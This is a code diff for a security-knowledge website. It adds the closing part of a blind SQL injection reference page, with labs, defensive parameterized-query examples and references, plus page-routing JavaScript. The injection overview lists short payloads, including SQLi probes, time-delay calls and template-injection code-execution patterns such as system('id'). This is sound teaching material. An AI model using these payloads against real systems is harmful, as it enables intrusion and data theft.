+| PortSwigger: Blind SQLi with conditional errors | Lab | https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors |
+| DVWA SQL Injection (Blind) - Low difficulty | Lab | Docker: \`vulnerables/web-dvwa\` |
+| OWASP WebGoat SQL injection lessons | Course | https://owasp.org/www-project-webgoat/ |
+| HackTheBox Academy: Blind SQL Injection | Course | https://academy.hackthebox.com/course/preview/blind-sql-injection |
+| SQLi-labs (GitHub) | Lab (65 levels) | https://github.com/Audi-1/sqli-labs |
+
+### Level 2-3: Intermediate Mastery
+
+| Resource | Focus | URL |
+|----------|-------|-----|
+| PortSwigger: All 7 blind SQLi labs | Complete lab set | https://portswigger.net/web-security/sql-injection/blind |
+| HackTheBox Academy: SQLMap Essentials | Tool mastery | https://academy.hackthebox.com/course/preview/sqlmap-essentials |
+| DVWA Blind SQLi - Medium/High difficulty | Filter bypass | Docker: \`vulnerables/web-dvwa\` |
+| PentesterLab boolean blind exercises | Technique practice | https://pentesterlab.com/ |
+| Build custom Python extraction script | Scripting skill | See script in Tools section above |
+| Master sqlmap tamper scripts | WAF bypass | https://github.com/sqlmapproject/sqlmap/tree/master/tamper |
+
+### Level 4-5: Research Grade
+
+| Resource | Focus | URL |
+|----------|-------|-----|
+| "Hakuin: Optimizing Blind SQLi with Probabilistic Language Models" | ML optimization | https://ieeexplore.ieee.org/document/10188624/ |
+| "NLP_SQL_BLIND" (Springer 2025) | NLP-integrated extraction | https://link.springer.com/chapter/10.1007/978-981-96-4016-4_14 |
+| WAFFLED (ACSAC 2025) | Automated WAF bypass discovery | https://arxiv.org/html/2503.10846v1 |
+| DEF CON 32: Protocol-level SQL smuggling | Protocol attacks | https://simonwillison.net/2024/Aug/12/smuggling-queries-at-the-protocol-level/ |
+| "Fastest Shot: Optimizing Blind SQLi" (HackMag) | Huffman tree optimization | https://hackmag.com/security/blind-sqli-optimize |
+| "Faster Blind MySQL Injection Using Bit Shifting" | Bit-level extraction | https://www.exploit-db.com/papers/17073 |
+| PortSwigger Research: "Listen to the whispers" | Timing attacks | https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work |
+| Contribute to Hakuin, WAFFLED, or sqlmap | Tool development | GitHub repos linked above |
+
+---
+
+## Defensive Countermeasures
+
+### Parameterized Queries (Code Examples)
+
+**Java (PreparedStatement):**
+\`\`\`java
+String username = request.getParameter("username");
+String query = "SELECT * FROM users WHERE username = ?";
+PreparedStatement stmt = connection.prepareStatement(query);
+stmt.setString(1, username);
+ResultSet results = stmt.executeQuery();
+\`\`\`
+
+**Python (psycopg2 / mysql-connector):**
+\`\`\`python
+username = request.args.get("username")
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+results = cursor.fetchall()
+\`\`\`
+
+**PHP (PDO):**
+\`\`\`php
+$username = $_POST['username'];
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
+$stmt->execute(['username' => $username]);
+$results = $stmt->fetchAll();
+\`\`\`
+
+**C# (.NET):**
+\`\`\`csharp
+string username = Request.QueryString["username"];
+string query = "SELECT * FROM users WHERE username = @username";
+SqlCommand cmd = new SqlCommand(query, connection);
+cmd.Parameters.AddWithValue("@username", username);
+SqlDataReader reader = cmd.ExecuteReader();
+\`\`\`
+
+**Node.js (pg / mysql2):**
+\`\`\`javascript
+const username = req.query.username;
+const result = await pool.query(
+    "SELECT * FROM users WHERE username = $1",
+    [username]
+);
+\`\`\`
+
+### ORM Safe Patterns vs Unsafe Patterns
+
+| ORM | Safe | Unsafe |
+|-----|------|--------|
+| Django | \`User.objects.filter(id=input)\` | \`User.objects.raw(f"...{input}...")\` |
+| Rails | \`User.where("id = ?", input)\` | \`User.where("id = #{input}")\` |
+| Sequelize | \`query('...?', [input])\` | \`\` query(\`...\${input}\`) \`\` |
+| Hibernate | \`setParameter("id", input)\` | \`createQuery("..."+input)\` |
+| Prisma | \`\` $queryRaw\`...\${input}\` \`\` | \`$queryRawUnsafe(...)\` |
+| SQLAlchemy | \`execute("...:id", {"id": input})\` | \`execute(f"...{input}...")\` |
+
+### Defense-in-Depth
+
+| Layer | Defense | Effectiveness Against Boolean Blind | Notes |
+|-------|---------|-------------------------------------|-------|
+| 1. Code | Parameterized queries | Eliminates vulnerability | Primary defense. Non-negotiable. |
+| 2. Code | ORM proper usage | High (when used correctly) | Avoid raw queries, validate filter inputs |
+| 3. Code | Allow-list validation | Supplementary | For table/column names, sort orders |
+| 4. Architecture | Least privilege DB accounts | Limits impact | Separate read/write accounts per function |
+| 5. Architecture | SQL views | Limits exposure | Expose hashed passwords, not raw |
+| 6. Network | WAF | Detects many attacks | Bypassable; defense-in-depth only |
+| 7. Runtime | RASP | High detection rate | Most expensive; hardest to bypass |
+| 8. Monitoring | SIEM + DB audit logs | Reactive detection | Binary search patterns in logs |
+
+### What Does NOT Work (As Sole Defense)
+
+| "Defense" | Why It Fails |
+|-----------|-------------|
+| Escaping user input alone | Fragile, DB-specific, bypassed by encoding tricks. OWASP: "STRONGLY DISCOURAGED" |
+| WAF alone | 20+ documented bypass categories; JSON-in-SQL bypassed 5 major vendors in 2022 |
+| ORM alone | \`raw()\`, \`extra()\`, operator injection, JSONField exploits all bypass ORM protections |
+| Error message suppression | CAPEC-7: "suppression alone is not sufficient to prevent SQL Injection" |
+| Client-side validation | Trivially bypassed by modifying requests directly |
+| Input length limits | Payloads can be shortened; \`' OR 1=1--\` is 12 characters |
+
+---
+
+## References
+
+### Primary Standards
+
+- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
+- [CAPEC-7: Blind SQL Injection](https://capec.mitre.org/data/definitions/7.html)
+- [OWASP Top 10 2025: A05 Injection](https://owasp.org/Top10/)
+- [OWASP WSTG-INPV-05: Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [CISA Secure by Design: Eliminating SQL Injection (2024)](https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-sql-injection-vulnerabilities-software)
+
+### Deep Research
+
+- [PortSwigger: Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
+- [PortSwigger: SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [HackTricks: SQL Injection](https://hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
+- [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+- [Invicti: SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet)
+- [Invicti: Blind SQL Injection](https://www.invicti.com/learn/blind-sql-injection)
+
+### Bug Bounty Writeups
+
+- [inDrive Boolean Blind SQLi ($4,134) -- HackerOne #2051931](https://hackerone.com/reports/2051931)
+- [U.S. DoD Boolean Blind via User-Agent -- HackerOne #2599826](https://hackerone.com/reports/2599826)
+- [Starbucks Blind SQLi + WAF Bypass -- HackerOne #549355](https://hackerone.com/reports/549355)
+- [Zomato Boolean SQLi -- HackerOne #301257](https://hackerone.com/reports/301257)
+<!-- Mail.ru #868436 was time-based blind, moved to time-based page -->
+- [CS Money Blind Boolean in URI Path -- HackerOne #1107536](https://hackerone.com/reports/1107536)
+- [Super Blind SQLi ($20,000)](https://medium.com/@pranshux0x/super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable-f9b013765448)
+
+### Conference Talks
+
+- [Hakuin: Injecting Brains Into Blind SQL Injection -- HITB 2023](https://conference.hitb.org/hitbsecconf2023hkt/session/hakuin-injecting-brains-into-blind-sql-injection/)
+- [SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level -- DEF CON 32 (2024)](https://simonwillison.net/2024/Aug/12/smuggling-queries-at-the-protocol-level/)
+- [Advanced Blind SQL Injection -- DEF CON 24 Workshop](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20workshops/)
+- [Using Binary Search Algorithms for Blind SQL Injection -- OWASP](https://www.classcentral.com/course/youtube-topics-of-interest-using-binary-search-algorithms-for-blind-sql-injection-juan-pablo-quine-paz-152508)
+
+### Academic Papers
+
+- [Hakuin: Optimizing Blind SQLi with Probabilistic Language Models (IEEE S&P Workshop 2023)](https://ieeexplore.ieee.org/document/10188624/)
+- [NLP_SQL_BLIND: Blind SQLi Optimization with Language Models (Springer 2025)](https://link.springer.com/chapter/10.1007/978-981-96-4016-4_14)
+- [WAFFLED: Exploiting Parsing Discrepancies to Bypass WAFs (ACSAC 2025)](https://arxiv.org/html/2503.10846v1)
+- [AdvSQLi: Generating Adversarial SQL Injections (2024)](https://arxiv.org/abs/2401.02615)
+- [BLIND SQL INJECTION ATTACKS OPTIMIZATION (AIRCC Vol 10)](https://aircconline.com/csit/papers/vol10/csit101909.pdf)
+- [Data Retrieval over DNS in SQL Injection Attacks (Stampar 2013)](https://arxiv.org/pdf/1303.3047)
+- [Faster Blind MySQL Injection Using Bit Shifting (Exploit-DB Paper 17073)](https://www.exploit-db.com/papers/17073)
+- [Fastest Shot: Optimizing Blind SQLi (HackMag)](https://hackmag.com/security/blind-sqli-optimize)
+- [{JS-ON: Security-OFF}: JSON-Based SQL to Bypass WAF (Claroty Team82 2022)](https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf)
+
+### Practice Labs
+
+- [PortSwigger: Blind SQLi with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+- [PortSwigger: Blind SQLi with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+- [PortSwigger: Blind SQLi with time delays and info retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+- [PortSwigger: Blind SQLi with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+- [HackTheBox Academy: Blind SQL Injection](https://academy.hackthebox.com/course/preview/blind-sql-injection)
+- [HackTheBox Academy: SQLMap Essentials](https://academy.hackthebox.com/course/preview/sqlmap-essentials)
+- [DVWA: SQL Injection (Blind)](https://github.com/digininja/DVWA)
+- [SQLi-labs: 65 levels including blind variants](https://github.com/Audi-1/sqli-labs)
+- [PentesterLab: Boolean-based blind exercises](https://pentesterlab.com/)
+
+### Tools
+
+- [sqlmap](https://github.com/sqlmapproject/sqlmap)
+- [Ghauri](https://github.com/r0oth3x49/ghauri)
+- [Hakuin](https://github.com/pruzko/hakuin)
+- [xxblind](https://github.com/secgroup/xxblind)
+- [blind-sql-bitshifting](https://github.com/awnumar/blind-sql-bitshifting)
+- [WAFFLED](https://github.com/sa-akhavani/waffled)
+- [bsqli.py](https://github.com/TrebledJ/bsqli.py)
+
+---
+
+## AI Agent Metadata
+
+\`\`\`json
+{
+  "id": "WEB-CAT01-SQLi-BlindBoolean",
+  "title": "Boolean-Based Blind SQL Injection",
+  "category": "CAT-01-Injection-Attacks",
+  "subcategory": "SQL Injection",
+  "severity": "CRITICAL",
+  "cvss_score": 9.8,
+  "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "cwe_id": "CWE-89",
+  "capec_id": "CAPEC-7",
+  "owasp_top10_2025": "A05:2025",
+  "owasp_top10_2021": "A03:2021",
+  "wasc_id": "WASC-19",
+  "wstg_id": "WSTG-INPV-05",
+  "attack_complexity": "low",
+  "privileges_required": "none",
+  "user_interaction": "none",
+  "skill_level": "medium",
+  "likelihood_of_attack": "high",
+  "typical_severity": "high",
+  "resources_required": "none",
+  "detection_difficulty": "medium",
+  "databases_affected": ["MySQL", "MariaDB", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "DB2", "BigQuery"],
+  "primary_tools": ["sqlmap", "Burp Suite", "ghauri", "Hakuin", "xxblind"],
+  "primary_cves": [
+    "CVE-2024-51482",
+    "CVE-2024-8924",
+    "CVE-2025-65093",
+    "CVE-2023-51448",
+    "CVE-2024-1698",
+    "CVE-2024-8529",
+    "CVE-2023-6360",
+    "CVE-2023-32308"
+  ],
+  "related_techniques": [
+    "CAT-01-SQLI-01-Union-Based",
+    "CAT-01-SQLI-03-Time-Based-Blind",
+    "CAT-01-SQLI-04-Error-Based",
+    "CAT-01-SQLI-05-Out-of-Band",
+    "CAT-01-SQLI-06-Second-Order"
+  ],
+  "mitre_attack_techniques": ["T1190", "T1003", "T1213", "T1565", "T1595"],
+  "kill_chain_phases": ["reconnaissance", "initial-access", "credential-access", "collection", "exfiltration"],
+  "remediation_primary": "parameterized_queries",
+  "remediation_secondary": ["orm_proper_usage", "allow_list_validation", "least_privilege", "waf"],
+  "payload_count": 105,
+  "total_cves_referenced": 15,
+  "total_writeups_referenced": 8,
+  "research_date": "2026-03-23",
+  "last_updated": "2026-03-24",
+  "version": "1.0.0"
+}
+\`\`\`
+`;
+
 /* CAT-01 has full content */
 CATEGORIES[0].content = "# CAT-01: Injection Attacks\n\n> **Domain:** Web Application -- **Phase:** 1 -- **CAPEC Category:** Inject Unexpected Items\n\n---\n\n## Category Overview\n\nInjection attacks occur when untrusted, attacker-controlled data is sent to an interpreter -- a database engine, OS shell, LDAP server, template engine, XML parser, or any other component that evaluates input as code or a command. The interpreter cannot distinguish between the intended instruction and the injected content, executing both.\n\nThe fundamental precondition for all injection vulnerabilities is the same: **user-controlled data is concatenated into a query, command, or expression without sufficient sanitization, parameterization, or contextual escaping.** The interpreter is working as designed -- the vulnerability is in how the application constructs the input to that interpreter.\n\n**Why it persists:** Developer trust of user input remains pervasive in legacy codebases, ORMs create false confidence, and WAF bypass techniques continuously outpace signature-based defenses. Injection was #1 on the OWASP Top 10 for over a decade and remains in the top 5 in 2025.\n\n---\n\n## Attack Surface Map\n\n```mermaid\ngraph TD\n    USER[User / Attacker Input] --> FORMS[HTML Forms]\n    USER --> PARAMS[URL Parameters]\n    USER --> HEADERS[HTTP Headers]\n    USER --> COOKIES[Cookies]\n    USER --> JSON[JSON / XML Body]\n    USER --> WSOCK[WebSocket Messages]\n    FORMS & PARAMS & HEADERS & COOKIES & JSON & WSOCK --> APP[Web Application]\n    APP --> SQL[SQL Engine]\n    APP --> NOSQL[NoSQL Engine]\n    APP --> OS[Operating System Shell]\n    APP --> LDAP[LDAP Directory]\n    APP --> XPATH[XPath / XML Parser]\n    APP --> TMPL[Template Engine]\n    APP --> EL[Expression Language]\n    APP --> LLM[LLM / AI Model]\n    SQL --> |SQLi| SQLI[Data theft - Auth bypass - RCE]\n    NOSQL --> |NoSQLi| NOSQLI[Auth bypass - Data exfiltration]\n    OS --> |CMDi| CMDI[RCE - Reverse shell]\n    LDAP --> |LDAPi| LDAPI[Auth bypass - Directory enum]\n    XPATH --> |XPathi| XPATHI[Data extraction - Auth bypass]\n    TMPL --> |SSTI| SSTII[RCE - Config read]\n    EL --> |ELi| ELI[RCE via OGNL - Spring SpEL]\n    LLM --> |Prompt Inj| PROMPTI[Goal hijack - Data exfil]\n```\n\n---\n\n## Attack Types in This Category\n\n| ID | Attack Type | Key CWEs | Subtypes | Severity |\n|----|------------|---------|---------|----------|\n| T01 | SQL Injection | CWE-89 | 12 | CRITICAL |\n| T02 | NoSQL Injection | CWE-943 | 5 | CRITICAL |\n| T03 | OS Command Injection | CWE-78 | 5 | CRITICAL |\n| T04 | SSTI | CWE-94, CWE-1336 | 9 | CRITICAL |\n| T05 | LDAP Injection | CWE-90 | 4 | HIGH |\n| T06 | XPath Injection | CWE-643 | 3 | HIGH |\n| T07 | EL / OGNL Injection | CWE-917 | 5 | CRITICAL |\n| T08 | XML Injection | CWE-91 | 4 | HIGH |\n| T09 | CRLF Injection | CWE-93, CWE-113 | 4 | HIGH |\n| T10 | Code Injection | CWE-94, CWE-95 | 5 | CRITICAL |\n| T11 | ORM Injection | CWE-89 | 4 | HIGH |\n| T12 | JSON Injection | CWE-74 | 4 | MEDIUM |\n| T13 | HTML Injection | CWE-79, CWE-80 | 3 | MEDIUM |\n| T14 | SMTP Injection | CWE-93 | 4 | MEDIUM |\n| T15 | Prompt Injection | CWE-1427 | 6 | HIGH |\n\n---\n\n## Universal Injection Pattern\n\nAll injection attacks share the same structural vulnerability:\n\n```\nVULNERABLE:\nquery = \"SELECT * FROM users WHERE id = \" + userInput\nuserInput = \"1 OR 1=1--\"\nquery = \"SELECT * FROM users WHERE id = 1 OR 1=1--\"  <-- Logic altered\n\nSECURE:\nquery = \"SELECT * FROM users WHERE id = ?\"\nexecute(query, [userInput])\nuserInput is data, never code -- interpreter separation maintained\n```\n\n---\n\n## Detection Heuristics (All Injection Types)\n\n| Probe Type | Payload Pattern | Indicator |\n|-----------|----------------|----------|\n| Error-based | `'`, `\"`, `)`, `` ` `` | Interpreter error in response |\n| Boolean differential | `AND 1=1`, `AND 1=2` | Different response content |\n| Time-based | `SLEEP(5)`, `WAITFOR DELAY` | Delayed response |\n| Out-of-band | DNS/HTTP callback payloads | External request received |\n| Syntax probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in response (SSTI/EL) |\n\n---\n\n## Injection by Interpreter\n\n<details>\n<summary><b>SQL -- Database Engines</b></summary>\n\n| Engine | Characteristic Syntax | Time Delay | Comment |\n|--------|----------------------|-----------|--------|\n| MySQL | `SLEEP(N)`, `-- -` | `SLEEP(5)` | `#` comment also works |\n| PostgreSQL | `pg_sleep(N)`, `--` | `pg_sleep(5)` | Stacked queries with `;` |\n| MSSQL | `WAITFOR DELAY`, `--` | `WAITFOR DELAY '0:0:5'` | `xp_cmdshell` for RCE |\n| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` | No stacked queries |\n| SQLite | `randomblob(N)` | `randomblob(500000000)` | Limited OOB options |\n\n</details>\n\n<details>\n<summary><b>SSTI -- Template Engines by Language</b></summary>\n\n| Engine | Language | Probe | RCE Payload Pattern |\n|--------|----------|-------|-------------------|\n| Jinja2 | Python | `{{7*7}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` |\n| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('exec')}}` |\n| Freemarker | Java | `${7*7}` | `<#assign ex=\"freemarker.template.utility.Execute\"?new()>` |\n| Velocity | Java | `#set($x=7*7)$x` | Reflection-based RCE |\n| Smarty | PHP | `{php}phpinfo();{/php}` | Direct PHP execution (legacy) |\n| ERB | Ruby | `<%= 7*7 %>` | `<%= system('id') %>` |\n\n</details>\n\n---\n\n## Prevention -- Universal Principles\n\n1. **Parameterized Queries / Prepared Statements** -- for all database interactions\n2. **Contextual Output Encoding** -- HTML, JS, URL, CSS context-aware escaping\n3. **Input Validation** -- allowlist approach for known-good values\n4. **Principle of Least Privilege** -- database accounts with minimal permissions\n5. **WAF as defense-in-depth** -- never as primary control\n6. **ORM safely** -- avoid raw query methods\n7. **Sandboxed template engines** -- no user-controlled template content\n\n---\n\n## References\n\n### Primary Standards\n- [OWASP -- Injection (A05:2025)](https://owasp.org/Top10/2025/A05_2025-Injection/)\n- [OWASP WSTG -- Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)\n- [CWE-74: Improper Neutralization](https://cwe.mitre.org/data/definitions/74.html)\n- [CAPEC-152: Inject Unexpected Items](https://capec.mitre.org/data/definitions/152.html)\n\n### Deep Research\n- [PortSwigger -- SQL Injection](https://portswigger.net/web-security/sql-injection)\n- [PortSwigger -- SSTI](https://portswigger.net/research/server-side-template-injection)\n- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)";
 
+
+var SUBTYPE_ROUTES = {
+  'cat-01:SQL Injection': 'sqli-blind-boolean'
+};
+function getSubtypeSlug(catSlug, typeName) {
+  return SUBTYPE_ROUTES[catSlug + ':' + typeName] || null;
+}
 
 /* ===== SHIELD.IO STRIPPING (FIX 2) ===== */
 function stripShields(md) {
@@ -430,6 +1921,7 @@ function renderPage(hash) {
   else if (hash === 'changelog') { document.title = 'GORGE | Changelog'; renderMarkdownPage(PAGES.changelog); }
   else if (hash === 'tools') { document.title = 'GORGE | Tools Index'; renderMarkdownPage(PAGES.tools); }
   else if (hash === 'labs') { document.title = 'GORGE | Lab Environments'; renderMarkdownPage(PAGES.labs); }
+  else if (hash === 'sqli-blind-boolean') { document.title = 'GORGE | Boolean-Based Blind SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Boolean-Based Blind SQLi', PAGES.sqli_blind_boolean); }
   else {
     var cat = findCategory(hash);
     if (cat) { document.title = 'GORGE | ' + cat.id + ' ' + cat.name; renderCategoryPage(cat); }
@@ -464,7 +1956,12 @@ function buildSidebar() {
     html += '</div>';
     html += '<div class="sidebar-sub-items" id="sub-' + cat.slug + '">';
     for (var j = 0; j < cat.types.length; j++) {
-      html += '<div class="sidebar-sub-item">' + escapeHtml(cat.types[j]) + '</div>';
+      var subSlug = getSubtypeSlug(cat.slug, cat.types[j]);
+      if (subSlug) {
+        html += '<div class="sidebar-sub-item" style="cursor:pointer;" onclick="navigateTo(\'' + subSlug + '\')">' + escapeHtml(cat.types[j]) + '</div>';
+      } else {
+        html += '<div class="sidebar-sub-item">' + escapeHtml(cat.types[j]) + '</div>';
+      }
     }
     html += '</div></div>';
   }
@@ -617,6 +2114,20 @@ function renderMarkdownPage(content) {
   var main = document.getElementById('mainContent');
   var h = '<div class="breadcrumb"><a href="#home" onclick="navigateTo(\'home\');return false;">Home</a></div>';
   h += '<div class="md-content" id="mdContent">' + renderMarkdown(content) + '</div>';
+  main.innerHTML = h;
+  postRender();
+}
+
+function renderSubtypePage(catId, typeName, subtypeName, content) {
+  var main = document.getElementById('mainContent');
+  var h = '<div class="breadcrumb">';
+  h += '<a href="#home" onclick="navigateTo(\'home\');return false;">Home</a> &gt; ';
+  h += '<a href="#' + catId.toLowerCase().replace('-','') + '" onclick="navigateTo(\'' + catId.toLowerCase().replace(/-/g,'').replace('cat','cat-') + '\');return false;">' + catId + '</a> &gt; ';
+  h += '<span>' + typeName + '</span> &gt; ';
+  h += '<span>' + subtypeName + '</span>';
+  h += '</div>';
+  h += '<div class="md-content" id="mdContent">' + renderMarkdown(content) + '</div>';
+  h += '<div style="margin-top:32px;padding-top:16px;border-top:1px solid var(--border);"><a href="#cat-01" onclick="navigateTo(\'cat-01\');return false;" style="color:var(--red);font-size:12px;">&#8592; Back to Injection Attacks</a></div>';
   main.innerHTML = h;
   postRender();
 }
